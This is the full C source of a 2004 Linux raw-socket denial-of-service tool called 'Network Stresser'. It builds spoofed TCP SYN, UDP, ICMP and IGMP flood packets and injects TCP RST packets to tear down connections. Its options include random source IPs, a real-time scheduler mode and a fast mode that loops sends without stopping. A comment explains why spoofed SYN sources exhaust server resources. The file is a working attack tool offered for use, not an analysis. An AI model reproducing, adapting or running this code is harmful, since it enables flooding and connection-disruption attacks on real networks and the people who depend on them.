/*

	Network Stresser v0.7 (Linux)

	Copyright 2004 Shen139 <shen139(at)eviltime(dot)com>


 Compile with: gcc stresser-0.7.c -o stresser -lpthread      #-Ox#

*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/igmp.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include "checksum.h"

#define VERSION			"0.7"

// #define CLEARSCREEN		// Uncomment this line to clear screen at startup


#define MAXHOSTIP		20
#define MAXHOSTLENGHT		20
#define MAXPORTS		20
#define PROTOCOLS		5

#define WIW(a)				(a==1) ? ltp.tcp.sd.sbound  :   \
					(a==2) ? ltp.udp.sd.sbound  :	\
					(a==3) ? ltp.icmp.sd.sbound :	\
					(a==4) ? ltp.igmp.sd.sbound :	\
						 ltp.trst.source_port	\
						&&			\
					(a==1) ? ltp.tcp.sd.dbound  :	\
					(a==2) ? ltp.udp.sd.dbound  :	\
					(a==3) ? ltp.icmp.sd.dbound :	\
					(a==4) ? ltp.igmp.sd.dbound :	\
						 ltp.trst.dest_port 		


pthread_t IDthread[PROTOCOLS];
pthread_t IDthrdWait;
pthread_mutex_t shit = 		PTHREAD_MUTEX_INITIALIZER;

struct _sd
{
	char source[MAXHOSTIP][MAXHOSTLENGHT];
	char   dest[MAXHOSTIP][MAXHOSTLENGHT];
	int sbound;
	int dbound;
};

struct _tcp_udp
{
	struct _sd sd;
	int ports[MAXPORTS];
};

struct _tcprst
{
	struct _sd sd;
	int seq;
	int source_port;
	int dest_port;
};

struct _icmp_igmp
{
	struct _sd sd;
};

struct listofip
{
	struct _tcp_udp		tcp;
	struct _tcp_udp		udp;
	struct _icmp_igmp	icmp;
	struct _icmp_igmp	igmp;
	struct _tcprst		trst;
}ltp;

int 	iStop		= 1,
	SeedB		= 0,
	iTime		= 10,
	iStep		= 1,
	flag_continue	= 0,
	bFastM		= 0;

void usage(char* arg0)
{
	printf("\n + Usage:\n");
	printf(" %s [protocol] [source(s):destination[s]]* [(tcp/udp) port(s)]\n\n",arg0);
	printf("  -s Number of seconds the stresser will flood (default: 10)\n");
	printf("  -r Real Time mode (Use with caution) (new)\n");
	printf("  -f Fast mode (new)\n");
	printf("   + Protocols\n");
	printf("   -t TCP SYN flood\n");
	printf("   -T TCP RST Attack (source:destination_Host/IP source_port:dest_port inital_seq_num)\n");
	printf("   -u UDP flood\n");
	printf("   -i ICMP flood\n");
	printf("   -g IGMP flood\n");
	printf("\n  * RANDOM generates random IPs\n");
	printf("\n For more information read the README\n");

exit(0);
}

void *fWait			(void*);
void  sigdie			(int);
void  onalarm			(/*nothing*/);
int   CompileIPhdr		(struct iphdr* ,char* ,char* ,int ,int);
int   ResolveHostIP		(char* ,struct _sd*);
void  RandomIP			(char*);
int   SeparateComma		(char*, int ,char[][], int*);
void *StressTCP			(/*nothing*/);
void *StressRST			(/*nothing*/);
void *StressUDP			(/*nothing*/);
void *StressICMP		(/*nothing*/);
void *StressIGMP		(/*nothing*/);
int   CompileTCPacket		(char*, char*, int, int, int, int, u_char*);
int   CompileUDPacket		(char*, char*, int, int, u_char*);
int   CompileICMPacket		(char*, char*, u_char*);
int   CompileIGMPacket		(char*, char*, int, int, u_char*);
int   SendPacket		(char*, u_char*, int, char*, char*, int);
void  set_priority		(int);



int main(int argc, char *argv[])
{
char vet[MAXHOSTIP][MAXHOSTLENGHT];
int i, c, n;
extern int optind;


#ifdef CLEARSCREEN
	printf("\33[H\33[2J");		// Clear Screen
#endif

	printf("+ Shen139's Network Stresser v%s\n",VERSION);
	printf("  - Coded by Shen139\n");
	printf("  - shen139(at)eviltime(dot)com\n");

	if(argc<3)
		usage(argv[0]);

	if(getuid())
	{
		fprintf(stderr, "- You must be root to run this program!\n" );
		return (0);
	}

	memset(&ltp,0,sizeof(ltp));

	while ((c = getopt(argc, argv, "sitTughrf?")) != -1)
		switch (c)
		{
		case 's':
			if(argc<=3)
			{
				printf(" -  Errors in arguments\n");
				usage(argv[0]);
			}
			iTime=atoi(argv[optind]);
			
			if (iTime==0) iTime=1;

			break;

		case 't':
			if(argc-1<optind+1)
			{
				printf(" -  Errors in arguments\n");
				usage(argv[0]);
			}
			printf("\n +  Resolving TCP (SYN) hostnames...");
			if(ResolveHostIP(argv[optind], &ltp.tcp.sd))
			{
				printf("\n -  Errors in arguments\n");
				usage(argv[0]);
			}
			SeparateComma(argv[optind+1], strlen(argv[optind+1]),vet, &n);

			memset(ltp.tcp.ports,0,sizeof(ltp.tcp.ports));
			printf("\n  +  TCP (SYN) Port(s):");
			for( i=0;i<n;i++)
			{
				ltp.tcp.ports[i]=atoi(vet[i]);
				if(ltp.tcp.ports[i]==0)
				{
					printf("\n -  Errors in arguments\n");
					usage(argv[0]);
				}

				printf("\n    - %i",ltp.tcp.ports[i]);
			}
			break;

		case 'T':
			if(argc-1<optind+2)
			{
				printf(" -  Errors in arguments\n");
				usage(argv[0]);
			}
			printf("\n +  Resolving TCP (RST) hostname...");
			if(ResolveHostIP(argv[optind], &ltp.trst.sd))
			{
				printf("\n -  Errors in arguments\n");
				usage(argv[0]);
			}

			for(i=0;i<=strlen(argv[optind+1]);i++)
				if(argv[optind+1][i]==':')
					break;

			printf("\n  +  TCP (RST) Port:");

			argv[optind][i]=0;
			ltp.trst.source_port = atoi(argv[optind+1]);
			argv[optind][i]=':';
			ltp.trst.dest_port = atoi(&argv[optind+1][i+1]);

			if(ltp.trst.source_port == 0 || ltp.trst.dest_port == 0)
			{
				printf("\n -  Errors in arguments\n");
				usage(argv[0]);
			}

			printf("\n    - Source port:       \t%i",ltp.trst.source_port);
			printf("\n    - Destination port:  \t%i",ltp.trst.dest_port);

			ltp.trst.seq = atoi(argv[optind+2]);

			if(ltp.trst.seq == 0)
			{
				printf("\n -  Errors in arguments\n");
				usage(argv[0]);
			}

			printf("\n  +  TCP (RST) Seq Number:\t%i",ltp.trst.seq);

			break;


		case 'u':
			if(argc-1<optind+1)
			{
				printf(" -  Errors in arguments\n");
				usage(argv[0]);
			}
			printf("\n +  Resolving UDP hostnames...");
			if(ResolveHostIP(argv[optind], &ltp.udp.sd))
			{
				printf("\n -  Errors in arguments\n");
				usage(argv[0]);
			}
			printf("\n  +  UDP Port(s):");
			SeparateComma(argv[optind+1], strlen(argv[optind+1]),vet, &n);

			memset(ltp.udp.ports,0,sizeof(ltp.udp.ports));
			
			for(i=0;i<n;i++)
			{
				ltp.udp.ports[i]=atoi(vet[i]);
				if(ltp.udp.ports[i]==0)
				{
					printf("\n -  Errors in arguments\n");
					usage(argv[0]);
				}
				printf("\n    - %i",ltp.udp.ports[i]);
			}
			break;

		case 'i':
			if(argc-1<optind)
			{
				printf(" -  Errors in arguments\n");
				usage(argv[0]);
			}
			printf("\n +  Resolving ICMP hostnames...");
			if(ResolveHostIP(argv[optind], &ltp.icmp.sd))
			{
				printf("\n -  Errors in arguments\n");
				usage(argv[0]);
			}

			break;

		case 'g':
			if(argc-1<optind)
			{
				printf(" -  Errors in arguments\n");
				usage(argv[0]);
			}
			printf("\n +  Resolving IGMP hostnames...");
			if(ResolveHostIP(argv[optind], &ltp.igmp.sd))
			{
				printf("\n -  Errors in arguments\n");
				usage(argv[0]);
			}
			break;

		case 'r':
			printf("\n +  Scheduler's priority:\t\t\t\tREAL TIME");
			
			set_priority(sched_get_priority_max(SCHED_RR));

			break;

		case 'f':
			printf("\n +  Fast Mode:           \t\t\t\tON");
			
			bFastM=1;

			break;

		case 'h':
		case '?':
		default:
			usage(argv[0]);
		}

	if(!flag_continue)	/*flag_continue==0*/
	//If no one calls "ResolveHostIP"...
		usage(argv[0]);
	
	printf("\n +  Stressing...(for %i second%s)\n",iTime, (iTime==1) ? "" : "s");
	
	fflush(stdout);

	for(i=1;i<=PROTOCOLS;i++)
		if(WIW(i))
			 if(pthread_create(&IDthread[i-1], NULL, 
				(i==1) ? (void*)StressTCP : 
				(i==2) ? (void*)StressUDP : 
				(i==3) ? (void*)StressICMP : 
				(i==4) ? (void*)StressIGMP :
					 (void*)StressRST, 
							NULL)!=0)
			 {
				printf("+    Thread error:\n");
				perror(" -    pthread_create() ");
				exit(0);
			 }

	if(pthread_create(&IDthrdWait, NULL, fWait, NULL)!=0)
	{
		printf("+    Thread error:\n");
		perror(" -    pthread_create() ");
		exit(0);
	}


	for(i=1;i<PROTOCOLS+1;i++)
		if(WIW(i))
			pthread_join(IDthread[i-1], NULL);

	printf("- Stressing complete\n");

exit(0);
}

void sigdie(int signo)
{
	//Only a thread must execute this code
	pthread_mutex_lock(&shit);

	fflush(stdout);

	//Nmap rulez :D
	switch(signo)
	{
	case SIGINT:
		fprintf(stderr, "- Caught SIGINT signal, cleaning up\n");
	break;
	case SIGTERM:
		fprintf(stderr, "- Caught SIGTERM signal, cleaning up\n");
	break;
	case SIGHUP:
		fprintf(stderr, "- Caught SIGHUP signal, cleaning up\n");
	break;
	default:
		fprintf(stderr, "- Caught signal %d, cleaning up\n", signo);
	break;
	}
	
exit(0);

	/*pthread_mutex_unlock(&shit);*/
}

void onalarm()
{
	iStop=0;
return;
}

void *fWait(void *arg)
{
	signal(SIGINT,  sigdie);
	signal(SIGHUP,  sigdie);
	signal(SIGTERM, sigdie);
	signal(SIGALRM,onalarm);
	
	alarm(iTime);

	while(iStop){/*nothing*/}

pthread_exit(0);
}

void set_priority (int priority)
{
struct sched_param sp;

	memset(&sp,0,sizeof(sp));

	sp.sched_priority = priority;
	sched_setscheduler(0, SCHED_RR, &sp);

return;
}

int CompileIPhdr(struct iphdr* ip,char* sAddr, char* dAddr,int protocol,int ID)
{
	//See RFC at: http://www.networksorcery.com/enp/protocol/ip.htm
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons(40);
	ip->id = ID;
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = protocol;
	ip->saddr = inet_addr(sAddr);
	ip->daddr = inet_addr(dAddr);
	ip->check  = ip_fast_csum((unsigned char *)&ip, ip->ihl);

return 1;
}

void RandomIP(char *buffer)
{
	if(SeedB>1000)
		SeedB=0;

	srand(time(NULL)+SeedB++);
	sprintf(buffer,"%i.%i.%i.%i"	,60+(int) (30.0*rand()/(RAND_MAX+1.0))
					,1+(int) (255.0*rand()/(RAND_MAX+1.0))
					,1+(int) (255.0*rand()/(RAND_MAX+1.0))
					,1+(int) (255.0*rand()/(RAND_MAX+1.0)));
return;
}

int SeparateComma(char *argv, int nc2s, char vet[MAXHOSTIP][MAXHOSTLENGHT], int *n)
{
int i,r=0,c=0;
char szTmp[MAXHOSTLENGHT];

	for(i=0;i<=nc2s;i++)
	{
		if(r>MAXHOSTIP)
			return 1;

		szTmp[c]=argv[i];
		c++;

		if(argv[i]==',')
		{
			szTmp[c-1]=0;
			c=0;
			strcpy(vet[r],szTmp);
			r++;
		}
	}

	szTmp[c-1]=0;
	c=0;
	strcpy(vet[r],szTmp);
	*n=r+1;

return 1;
}

int ResolveHostIP(char* argv, struct _sd *sd)
{
int i,c=0,nC,nl;
struct hostent*hp;
 struct _sTmp
 {
	char szTmp[MAXHOSTIP][MAXHOSTLENGHT];
 }*sTmp;

	memset(sd,0,sizeof(sd));

	for(nC=0;nC<=strlen(argv);nC++)
		if(argv[nC]==':')
			break;

	if(strlen(argv)-nC<6)
		return 1;

	SeparateComma(argv,nC,sd->source,&sd->sbound);
	SeparateComma(argv+nC+1,strlen(argv)-nC-1,sd->dest,&sd->dbound);

	//This code is processed at least 1 time...
	flag_continue=1;

	for(c=0;c<2;c++)
	{
		if(c==0)
		{
			(char**)sTmp=&sd->source;
			nl=sd->sbound;
		}
		else
		{
			(char**)sTmp=&sd->dest;
			nl=sd->dbound;
		}

		if (nl > MAXHOSTIP)
		{
			printf("\n- Error: Too much host(s)/IP(s) in list!\n");
			exit(0);
		}
			
		for(i=0;i<nl;i++)
		{
			if(strcmp(sTmp->szTmp[i],"RANDOM")==0)
			{
				printf("\n   - Random ip");
				continue;
			}
			printf("\n   - Resolving %s",sTmp->szTmp[i]);

			hp=gethostbyname(sTmp->szTmp[i]);
			if(hp!=NULL)
			{
				strncpy(sTmp->szTmp[i],inet_ntoa(*(struct in_addr *)hp->h_addr),sizeof(sTmp->szTmp[i]));
				printf(" -> %s\t\t\t[  OK  ]",inet_ntoa(*(struct in_addr *)hp->h_addr));
			}
			else
			{
				printf("\t\t\t[ERROR ]\n");
				exit(0);
			}
		}
	}

return 0;
}

void *StressTCP()
{
int is=0,id=0,i_p=0,ID;
char tmpSIP[16],tmpDIP[16];
int nPack=0;
u_char* packet;

	ID=getpid();
	while(iStop)
	{
		strncpy(tmpDIP,ltp.tcp.sd.dest[id],16); 
		strncpy(tmpSIP,ltp.tcp.sd.source[is],16); 

		if(strcmp(ltp.tcp.sd.source[is],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.tcp.sd.dest[id],"RANDOM")==0) 
			RandomIP(tmpDIP);

		packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct tcphdr));

		//The source ip should be down otherwise when the client recives the syn/ack flags
		//will replay with a rst flag and the server will free all the resources allocated!
		CompileTCPacket(tmpSIP,tmpDIP,ltp.tcp.ports[i_p],rand()*1000,1,ID,packet);

		SendPacket("TCP", packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 
					tmpSIP,tmpDIP, ltp.tcp.ports[i_p]);
		nPack++;		

		if(bFastM)
		{
			while(iStop)
			{
				SendPacket("TCP", packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 
								tmpSIP,tmpDIP, ltp.tcp.ports[i_p]);
				nPack++;		
			}
		}
		
		free(packet);
		is++; id++; i_p++;
		if(ltp.tcp.sd.source[is][0]==0)
			is=0;
		if(ltp.tcp.sd.dest[id][0]==0)
			id=0;
		if(!ltp.tcp.ports[i_p])
			i_p=0;

		ID++;

	}
	printf("   - TCP (SYN) packet sent:\t%i\n",nPack);

pthread_exit(0);
}

void *StressRST()
{
int ID;
char tmpSIP[16],tmpDIP[16];
int nPack=0;
u_char* packet;

	ID=ltp.trst.seq;
	while(iStop)
	{
		strncpy(tmpDIP,ltp.trst.sd.dest[0],16); 
		strncpy(tmpSIP,ltp.trst.sd.source[0],16); 

		if(strcmp(ltp.trst.sd.source[0],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.trst.sd.dest[0],"RANDOM")==0) 
			RandomIP(tmpDIP);

		packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct tcphdr));

		CompileTCPacket(tmpSIP,tmpDIP,ltp.trst.source_port,ltp.trst.dest_port,2,ID,packet);

		SendPacket("RST", packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 
					tmpSIP,tmpDIP, ltp.trst.dest_port);
		nPack++;		

		if(bFastM)
		{
			while(iStop)
			{
				SendPacket("RST", packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 
								tmpSIP,tmpDIP, ltp.trst.dest_port);
				nPack++;		
			}
		}
		
		free(packet);
		
		ID++;

	}
	printf("   - TCP (RST) packet sent:\t%i\n",nPack);

pthread_exit(0);
}


void *StressUDP()
{
int is=0,id=0,i_p=0,ID;
char tmpSIP[16],tmpDIP[16];
int nPack=0;
u_char* packet;

	ID=getpid();
	while(iStop)
	{
		strncpy(tmpSIP,ltp.udp.sd.source[is],16); 
		strncpy(tmpDIP,ltp.udp.sd.dest[id],16); 
		if(strcmp(ltp.udp.sd.source[is],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.udp.sd.dest[id],"RANDOM")==0) 
			RandomIP(tmpDIP);

		packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct udphdr));
		CompileUDPacket(tmpSIP,tmpDIP,ltp.udp.ports[i_p],ID,packet);

		SendPacket("UDP", packet, sizeof(struct iphdr)+sizeof(struct udphdr), 
						tmpSIP,tmpDIP, ltp.udp.ports[i_p]);

		nPack++;

		if(bFastM)
		{
			while(iStop)
			{
				SendPacket("UDP", packet, sizeof(struct iphdr)+sizeof(struct udphdr), 
							tmpSIP,tmpDIP, ltp.udp.ports[i_p]);
				nPack++;		
			}
		}
		free(packet);
		is++; id++; i_p++;
		if(ltp.udp.sd.source[is][0]==0)
			is=0;
		if(ltp.udp.sd.dest[id][0]==0)
			id=0;
		if(!ltp.udp.ports[i_p])
			i_p=0;
		ID++;

	}
	printf("   - UDP packet sent:        \t%i\n",nPack);

pthread_exit(0);
}

void *StressICMP()
{
int is=0,id=0;
char tmpSIP[16],tmpDIP[16];
int nPack=0;
u_char* packet;

	while(iStop)
	{
		strncpy(tmpSIP,ltp.icmp.sd.source[is],16); 
		strncpy(tmpDIP,ltp.icmp.sd.dest[id],16); 

		if(strcmp(ltp.icmp.sd.source[is],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.icmp.sd.dest[id],"RANDOM")==0) 
			RandomIP(tmpDIP);

		packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct icmp));
		CompileICMPacket(tmpSIP,tmpDIP,packet);

		SendPacket("ICMP", packet, sizeof(struct iphdr)+sizeof(struct icmp), 
					tmpSIP,tmpDIP, 1);
		nPack++;

		if(bFastM)
		{
			while(iStop)
			{
				SendPacket("ICMP", packet, sizeof(struct iphdr)+sizeof(struct icmp), 
							tmpSIP,tmpDIP, 1);
				nPack++;		
			}
		}
		free(packet);
		is++; id++;
		if(ltp.icmp.sd.source[is][0]==0)
			is=0;
		if(ltp.icmp.sd.dest[id][0]==0)
			id=0;
	}
	printf("   - ICMP packet sent:       \t%i\n",nPack);

pthread_exit(0);
}

void *StressIGMP()
{
int is=0,id=0;
char tmpSIP[16],tmpDIP[16];
int nPack=0;
u_char* packet;

	while(iStop)
	{
		strncpy(tmpSIP,ltp.igmp.sd.source[is],16); 
		strncpy(tmpDIP,ltp.igmp.sd.dest[id],16); 

		if(strcmp(ltp.igmp.sd.source[is],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.igmp.sd.dest[id],"RANDOM")==0) 
			RandomIP(tmpDIP);

		packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct igmp));
		//Type: 0x11 Membership query
		CompileIGMPacket(tmpSIP,tmpDIP,nPack,0,packet);

		SendPacket("IGMP", packet, sizeof(struct iphdr)+sizeof(struct igmp), 
					tmpSIP,tmpDIP, 1);
		nPack++;

		if(bFastM)
		{
			while(iStop)
			{
				SendPacket("IGMP", packet, sizeof(struct iphdr)+sizeof(struct igmp), 
							tmpSIP,tmpDIP, 1);
				nPack++;		
			}
		}
		free(packet);
		is++; id++;
		if(ltp.igmp.sd.source[is][0]==0)
			is=0;
		if(ltp.igmp.sd.dest[id][0]==0)
			id=0;
	}
	printf("   - IGMP packet sent:       \t%i\n",nPack);

pthread_exit(0);
}

int CompileICMPacket(char *soAddr,char *dAddr, u_char *rPckt)
{
struct iphdr ip;
struct icmphdr icmp;
u_char *packet;

	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct icmp));
	memset(packet,0,sizeof(packet));
	memset(&icmp,0,sizeof(icmp));

	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_ICMP,getpid());
	memcpy(packet,&ip,sizeof(ip));

	//See RFC at: http://www.networksorcery.com/enp/protocol/icmp.htm

	memset(&icmp,0,sizeof(icmp));
	icmp.type = ICMP_ECHO;
	icmp.checksum = 0xfff7;

	memcpy(packet + sizeof(struct iphdr), &icmp, sizeof(icmp));

	memcpy(rPckt,packet,sizeof(struct iphdr)+sizeof(struct icmp));
free(packet);
return 1;
}

int CompileTCPacket(char *soAddr,char *dAddr,int sport,int dport, int nseq,int flag, u_char *rPckt)
/*	Flag == 1 ? -> SYN on
		else   RST on
*/
{
struct iphdr ip;
struct tcphdr tcp;
u_char *packet;
struct psd_tcp psdtcp;

	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct tcphdr));

	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_TCP,getpid());

	memcpy(packet,&ip,sizeof(ip));

	//See RFC at: http://www.networksorcery.com/enp/protocol/tcp.htm
	tcp.source = htons(sport);
	tcp.dest   = htons(dport);
	tcp.seq = nseq;
	tcp.ack_seq = 0;
	tcp.res1 = 0;
	tcp.doff = 5;
	tcp.fin  = 0;

	if(flag==1)
		tcp.syn  = 1;
	else
		tcp.rst  = 1;
	tcp.psh  = 0;
	tcp.ack  = 0;
	tcp.urg  = 0;
	tcp.res2 = 0;
	tcp.window = htons(32767);
	tcp.urg_ptr = 0;
	tcp.check = 0;
	psdtcp.src.s_addr=ip.saddr;
	psdtcp.dst.s_addr=ip.daddr;
	psdtcp.pad=0;
	psdtcp.proto=IPPROTO_TCP;
	psdtcp.tcp_len=htons(sizeof(tcp));

	memcpy(&psdtcp.tcp,&tcp,sizeof(tcp));

	tcp.check = in_cksum((unsigned short *)&psdtcp, sizeof(psdtcp));
	memcpy(packet + sizeof(struct iphdr), &tcp, sizeof(tcp));

	memcpy(rPckt,packet,sizeof(struct iphdr)+sizeof(struct tcphdr));
free(packet);
return 1;
}

int CompileUDPacket(char *soAddr, char *dAddr, int port, int ID, u_char *rPckt)
{
struct iphdr ip;
struct udphdr udp;
u_char *packet;
struct psd_udp psdudp;

	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct udphdr));

	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_UDP,ID);
	memcpy(packet,&ip,sizeof(ip));

	//See RFC at: http://www.networksorcery.com/enp/protocol/udp.htm
	udp.len = htons(sizeof(udp));
	udp.dest = htons(port);
	udp.source = htons(port);
	udp.check=0;

	psdudp.src.s_addr=ip.saddr;
	psdudp.dst.s_addr=ip.daddr;
	psdudp.pad=0;
	psdudp.proto=IPPROTO_UDP;
	psdudp.udp_len=htons(sizeof(udp));

	memcpy(&psdudp.udp,&udp,sizeof(udp));

	udp.check = in_cksum((unsigned short *)&psdudp, sizeof(psdudp));

	memcpy(packet + sizeof(struct iphdr), &udp, sizeof(udp));

	memcpy(rPckt,packet,sizeof(struct iphdr)+sizeof(struct udphdr));
free(packet);	
return 1;
}

int CompileIGMPacket(char *soAddr,char *dAddr,int igmpType,int igmpRoutinCode, u_char *rPckt)
{
struct iphdr ip;
struct igmp igmp;
u_char *packet;

	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct igmp));
	memset(packet,0,sizeof(packet));

	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_IGMP,getuid());
	memcpy(packet,&ip,sizeof(ip));

	//See RFC at: http://www.networksorcery.com/enp/protocol/igmp.htm
	igmp.igmp_type=igmpType;
	igmp.igmp_code=igmpRoutinCode;
	igmp.igmp_cksum=0;
	igmp.igmp_cksum = in_cksum((u_short *)&igmp, sizeof(struct igmp));

	memcpy(packet + sizeof(struct iphdr), &igmp, sizeof(struct igmp));

	memcpy(rPckt,packet,sizeof(struct iphdr)+sizeof(struct igmp));
free(packet);
return 1;
}

int SendPacket(char protocol[4], u_char* packet, int size, char *soAddr,char* dAddr, int port)
{
struct sockaddr_in saddr;
int sock;/*,optv=1;*/

	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);
	saddr.sin_addr.s_addr = inet_addr(soAddr);

	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0)
	{
		fprintf(stderr,"+  %s packet error\n",(strcmp(protocol,"TCP")==0) ? "TCP (SYN)" : 
						((strcmp(protocol,"RST")==0) ? "TCP (RST)" : protocol));
		perror("   - Socket() ");
		pthread_exit(0);
	}

	/*setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)optv,optv);*/
	
	if(sendto(sock, packet, size, 0, (struct sockaddr*)&saddr, sizeof(saddr))==-1)
	{
		fprintf(stderr,"+  %s packet error\n",protocol);
		perror("   - sendto() ");
		fprintf(stderr,"   + Debug\n    - Source Address: %s\n    - Destination Address: %s\n    - Port: %i\n"
				,soAddr,dAddr,port);
		pthread_exit(0);
	}

	close(sock);

return 1;
}


/*eof*/

